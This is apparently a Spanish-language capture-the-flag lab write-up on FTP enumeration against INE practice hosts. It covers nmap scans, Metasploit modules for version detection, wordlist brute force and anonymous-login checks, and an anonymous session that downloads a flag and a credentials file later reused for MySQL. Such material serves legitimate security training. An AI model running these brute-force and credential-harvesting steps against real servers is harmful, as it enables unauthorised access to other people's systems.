# 🔌 Enumeración FTP

## 📡 Verificación del servicio

Antes de lanzar cualquier módulo, se confirma que el objetivo es accesible y que el puerto FTP está abierto.

```bash
ping -c 4 demo.ine.local
nmap -p 21 demo.ine.local         # Verificar específicamente el puerto FTP
nmap -sV demo.ine.local           # Detección de versiones de todos los puertos
```

## 🧰 Módulos de Metasploit

### 🔍 Detección de la versión

```bash
msfconsole
use auxiliary/scanner/ftp/ftp_version
set RHOSTS demo.ine.local
run
```

### 🔐 Fuerza bruta de credenciales

Se utilizan los diccionarios incluidos en Kali para intentar encontrar combinaciones válidas.

```bash
use auxiliary/scanner/ftp/ftp_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

### 👤 Acceso anónimo

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS demo.ine.local
run
```

## 🖥️ Conexión manual con el cliente FTP

Si se permite el acceso anónimo o se obtienen credenciales, se puede iniciar una sesión interactiva.

```bash
ftp demo.ine.local
```

Cuando solicite credenciales:
- Nombre: `anonymous`
- Contraseña: `anonymous` (o simplemente presionar Enter)

## 🏁 Ejemplo práctico – Acceso anónimo y captura de banderas

En este escenario se explota un servidor vsFTPd 3.0.5 con inicio de sesión anónimo habilitado.

```bash
ftp target.ine.local
```

**Entrada esperada:**
```
Connected to target.ine.local.
220 (vsFTPd 3.0.5)
Name (target.ine.local:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||29285|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0              22 Oct 28  2024 creds.txt
-rw-r--r--    1 0        0              39 Jan 05 19:44 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
229 Entering Extended Passive Mode (|||15499|)
150 Opening BINARY mode data connection for flag.txt (39 bytes).
100% |********************************************************|    39      810.33 KiB/s    00:00 ETA
226 Transfer complete.
39 bytes received in 00:00 (120.14 KiB/s)
ftp> bye
221 Goodbye.
```

### 📄 Contenido de los archivos descargados

```bash
cat flag.txt
```

```
FLAG3_b09e93fc63d24140846e16ec1115bca5
```

```bash
cat creds.txt
```

```
db_admin:password@123
```

Las credenciales `db_admin:password@123` pueden aprovecharse posteriormente para acceder a una base de datos MySQL.

## 📋 Resumen de comandos útiles

| Comando / Módulo | Propósito |
|------------------|-----------|
| `nmap -p 21` | Verificar si el puerto FTP está abierto |
| `auxiliary/scanner/ftp/ftp_version` | Obtener versión del servidor FTP |
| `auxiliary/scanner/ftp/ftp_login` | Ataque de fuerza bruta con diccionarios |
| `auxiliary/scanner/ftp/anonymous` | Detectar si el acceso anónimo está permitido |
| `ftp <ip>` | Cliente FTP interactivo |
